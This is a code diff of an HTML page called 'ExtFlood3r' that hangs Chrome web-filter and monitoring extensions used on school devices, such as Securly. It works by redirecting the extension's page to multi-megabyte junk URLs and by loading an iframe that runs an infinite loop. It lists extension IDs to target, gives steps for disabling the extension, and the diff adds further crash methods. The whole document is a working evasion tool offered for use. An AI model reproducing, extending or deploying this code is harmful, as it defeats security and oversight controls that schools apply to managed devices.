@@ -1,93 +1,131 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>ExtFlood3r</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;700&display=swap');
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Fira Sans', sans-serif;
+            background-color: #1f1f1f;
+            color: #f0f0f0;
             margin: 0;
-            padding: 20px;
+            padding: 40px 20px;
             text-align: center;
         }
 
         h2 {
-            color: #333;
+            font-size: 2rem;
             margin-bottom: 10px;
         }
 
         p {
-            color: #555;
-            font-size: 18px;
-        }
-
-        select {
             font-size: 16px;
-            padding: 10px;
+            color: #bbb;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            width: 90%;
-            max-width: 400px;
-        }
-
-        button {
-            font-size: 16px;
-            padding: 12px 20px;
-            margin: 10px 0;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-
-        iframe {
-            display: none;
         }
 
         .container {
             max-width: 600px;
-            background: white;
-            padding: 20px;
             margin: auto;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background: #2c2c2c;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 25px rgba(0,0,0,0.4);
+        }
+
+        select {
+            font-size: 16px;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            margin: 20px 0;
+            width: 100%;
+            background: #3a3a3a;
+            color: #fff;
+        }
+
+        button {
+            font-size: 16px;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #4caf50;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.3; }
+            50% { opacity: 1; }
+            100% { opacity: 0.3; }
         }
     </style>
     <script>
         function hanger() {
+            const loadingText = document.getElementById("loading");
+            loadingText.style.display = "block";
+
             let extURL = document.getElementById("extensionSelect").value;
             let extWin = window.open(extURL);
 
-            setTimeout(function() {
-                let killURL = "https://" + "e".repeat(2000000); // generates a really long URL that hangs the extension page
+            // Hang via multiple attacks
+            setTimeout(function () {
+                // 1: long redirect
+                let killURL = "https://" + "e".repeat(5000000);
                 extWin.location.href = killURL;
-                let iframe = document.createElement("iframe"); // iframe so that the extension wont restore itself when the switch is flipped
-                iframe.src = extURL;
-            	iframe.style.width = "10px";
-            	iframe.style.height = "10px";
-            	iframe.style.border = "none";
-            	document.body.appendChild(iframe);
-                setTimeout(function() {
-		    extWin.close()
-            	}, 1000);
-            }, 100);
+
+                // 2: multiple random junk URLs
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => {
+                        extWin.location.href = "https://" + Math.random().toString(36).repeat(100000);
+                    }, 300 * i);
+                }
+
+                // 3: iframe infinite loop
+                let iframe = document.createElement("iframe");
+                iframe.srcdoc = `<script>while(true){}</script>`;
+                iframe.style.width = "1px";
+                iframe.style.height = "1px";
+                iframe.style.border = "none";
+                document.body.appendChild(iframe);
+
+                // 4: delay before closing
+                setTimeout(function () {
+                    extWin.close();
+                    loadingText.style.display = "none";
+                }, 5000); // longer timeout to keep it alive
+            }, 200);
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <h2>ExtFlood3r</h2>
-    This is probably the stupidest yet most reliable extension hanger method. This literally just opens an extension page and redirects to a long ass url why does this actually work
-    <br><br>
-    It lasts longer than exthang3r (and maybe extprint3r) while taking under 2 seconds to hang the extension 😭
-    <br><br>
+        <h2>ExtFlood3r <span style="font-size: 1rem; color: #4caf50;">by dennis</span></h2>
+        <p>The dumbest but most stubborn extension crasher.</p>
+        <p>It opens the extension, blasts it with junk URLs, iframe loops, and random chaos.</p>
+
         <select id="extensionSelect">
             <option value="chrome-extension://lcgajdcbmhepemmlpemkkpgagieehmjp/fonts/Metropolis.css">Securly (4th ID)</option>
             <option value="chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css">Securly (3rd ID)</option>
@@ -127,9 +165,11 @@
             <option value="chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png">Lugus School</option>
         </select>
 
-        <button onclick="hanger()">Hang extension</button>
+        <button onclick="hanger()">💥 Hang Extension</button>
+        <div class="loading" id="loading">Deploying hang protocol...</div>
 
-        <p>once u hang it flip the allow access to file urls to kill it and then u can close this tab. just like all the other hangers this only works with one extension at a time</p>
+        <p>Tip: Flip "Allow access to file URLs" after to fully break it.</p>
+        <div class="footer">Made for laughs & chaos — <strong>DENNIS</strong></div>
     </div>
 </body>
 </html>
